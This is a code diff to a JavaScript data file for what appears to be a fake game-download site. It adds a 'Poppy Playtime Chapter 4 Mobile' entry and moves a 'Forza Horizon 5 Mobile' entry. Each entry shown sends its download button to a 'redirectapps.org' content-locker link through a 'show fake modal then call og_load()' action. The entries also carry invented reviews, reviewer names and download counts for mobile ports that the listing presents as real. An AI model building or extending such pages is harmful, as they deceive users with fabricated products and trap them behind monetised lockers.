@@ -10,73 +10,71 @@ import {
 
 export const games = [
   {
-    id: "forza-horizon-5",
-    title: "Forza Horizon 5",
-    shortName: "FORZA HORIZON 5 MOBILE",
-    developer: "Playground Games",
-    rating: 4.9,
-    downloads: "3.1M",
-    size: "3.8 GB",
-    version: "1.0.0",
-    age: "12+",
+  id: "poppy-playtime-chapter-4",
+  title: "Poppy Playtime Chapter 4",
+  shortName: "POPPY PLAYTIME 4 MOBILE",
+  // developer: "Mob Entertainment",
+  rating: 4.7,
+  downloads: "4.9M",
+  size: "1.1 GB",
+  version: "1.0.0",
+  age: "16+",
 
-    // 🔒 KEEP LOCKER (UNCHANGED)
-    downloadUrl: "https://redirectapps.org/cl/i/6ndjjm",
-    lockerId: "6ndjjm",
+  // 🔒 KEEP LOCKER (UNCHANGED)
+  downloadUrl: "https://redirectapps.org/cl/i/9vvwow",
+  lockerId: "9vvwow",
 
-    category: "Racing / Open World",
+  category: "Horror / Puzzle",
 
-    // 🖼️ HERO IMAGE (FORZA)
-    heroImage:
-      "https://playground-website.uksouth01.umbraco.io/media/5apnsvbx/forza-horizon-5-sand-dunes-logo.jpg",
+  // 🖼️ HERO IMAGE
+  heroImage:
+    "https://fr.egw.news/_next/image?url=https%3A%2F%2Fegw.news%2Fuploads%2Fnews%2F1%2F17%2F1752851644647_1752851644648.webp&w=1920&q=75",
 
-    // 🖼️ KEEP IMAGES (UNCHANGED)
-    images: [
-      "https://www.latestmodapks.com/wp-content/uploads/2024/10/94fbr-gta-5-mobile-1-media.jpg",
-      "https://root-nation.com/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2021/08/GTA5-Mobile-APK-02.jpg.webp",
-      "https://www.latestmodapks.com/wp-content/uploads/2022/08/gta-5-mobile2.jpeg",
-    ],
+  images: [
+    "https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2889390/ss_1.jpg",
+    "https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2889390/ss_2.jpg",
+    "https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2889390/ss_3.jpg",
+  ],
 
-    description:
-      "Experience the ultimate open-world racing adventure in Forza Horizon 5. Explore Mexico with hundreds of high-performance cars, dynamic seasons, and breathtaking environments.",
+  description:
+    "Enter the terrifying world of Poppy Playtime Chapter 4. Explore the abandoned toy factory, solve dark puzzles, and survive against the horrifying toys that lurk in the shadows.",
 
-    downloadButtonAction: "show fake modal then call og_load()",
+  downloadButtonAction: "show fake modal then call og_load()",
 
-    features: [
-      {
-        icon: faCar,
-        title: "Open World Racing",
-        desc: "Huge Mexico map to explore",
-      },
-      {
-        icon: faGlobe,
-        title: "Online Horizon",
-        desc: "Race with players worldwide",
-      },
-      {
-        icon: faShield,
-        title: "Realistic Cars",
-        desc: "Official licensed vehicles",
-      },
-    ],
 
-    reviews: [
-      {
-        name: "Ryan Cooper",
-        initials: "RC",
-        rating: 5,
-        text: "Insane racing game! The graphics and car physics are next level.",
-        gradient: "from-orange-500 to-yellow-500",
-      },
-      {
-        name: "Lucas Martin",
-        initials: "LM",
-        rating: 4.8,
-        text: "Best open-world racing experience ever. Feels like console quality.",
-        gradient: "from-red-500 to-pink-500",
-      },
-    ],
-  },
+  // ❌ NO ICONS HERE
+  features: [
+    {
+      title: "New Horror Chapter",
+      desc: "Continue the terrifying Poppy Playtime story",
+    },
+    {
+      title: "Dark Puzzles",
+      desc: "Solve mysteries inside the toy factory",
+    },
+    {
+      title: "Terrifying Enemies",
+      desc: "Escape dangerous toys hiding in the dark",
+    },
+  ],
+
+  reviews: [
+    {
+      name: "Oliver Hayes",
+      initials: "OH",
+      rating: 5,
+      text: "This chapter is the scariest one yet. Amazing horror atmosphere!",
+      gradient: "from-purple-600 to-red-600",
+    },
+    {
+      name: "Mason Clark",
+      initials: "MC",
+      rating: 4.6,
+      text: "Great puzzles and creepy moments. Loved the new characters.",
+      gradient: "from-gray-700 to-gray-900",
+    },
+  ],
+},
   {
   id: "red-dead-redemption-2",
   title: "Red Dead Redemption 2",
@@ -336,7 +334,76 @@ export const games = [
       gradient: "from-blue-600 to-cyan-600",
     },
   ],
-}
+},
+{
+    id: "forza-horizon-5",
+    title: "Forza Horizon 5",
+    shortName: "FORZA HORIZON 5 MOBILE",
+    developer: "Playground Games",
+    rating: 4.9,
+    downloads: "3.1M",
+    size: "3.8 GB",
+    version: "1.0.0",
+    age: "12+",
+
+    // 🔒 KEEP LOCKER (UNCHANGED)
+    downloadUrl: "https://redirectapps.org/cl/i/6ndjjm",
+    lockerId: "6ndjjm",
+
+    category: "Racing / Open World",
+
+    // 🖼️ HERO IMAGE (FORZA)
+    heroImage:
+      "https://playground-website.uksouth01.umbraco.io/media/5apnsvbx/forza-horizon-5-sand-dunes-logo.jpg",
+
+    // 🖼️ KEEP IMAGES (UNCHANGED)
+    images: [
+      "https://www.latestmodapks.com/wp-content/uploads/2024/10/94fbr-gta-5-mobile-1-media.jpg",
+      "https://root-nation.com/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2021/08/GTA5-Mobile-APK-02.jpg.webp",
+      "https://www.latestmodapks.com/wp-content/uploads/2022/08/gta-5-mobile2.jpeg",
+    ],
+
+    description:
+      "Experience the ultimate open-world racing adventure in Forza Horizon 5. Explore Mexico with hundreds of high-performance cars, dynamic seasons, and breathtaking environments.",
+
+    downloadButtonAction: "show fake modal then call og_load()",
+
+    features: [
+      {
+        icon: faCar,
+        title: "Open World Racing",
+        desc: "Huge Mexico map to explore",
+      },
+      {
+        icon: faGlobe,
+        title: "Online Horizon",
+        desc: "Race with players worldwide",
+      },
+      {
+        icon: faShield,
+        title: "Realistic Cars",
+        desc: "Official licensed vehicles",
+      },
+    ],
+
+    reviews: [
+      {
+        name: "Ryan Cooper",
+        initials: "RC",
+        rating: 5,
+        text: "Insane racing game! The graphics and car physics are next level.",
+        gradient: "from-orange-500 to-yellow-500",
+      },
+      {
+        name: "Lucas Martin",
+        initials: "LM",
+        rating: 4.8,
+        text: "Best open-world racing experience ever. Feels like console quality.",
+        gradient: "from-red-500 to-pink-500",
+      },
+    ],
+  },
+
 // {
   //   id: "gta-v",
   //   title: "Grand Theft Auto V",
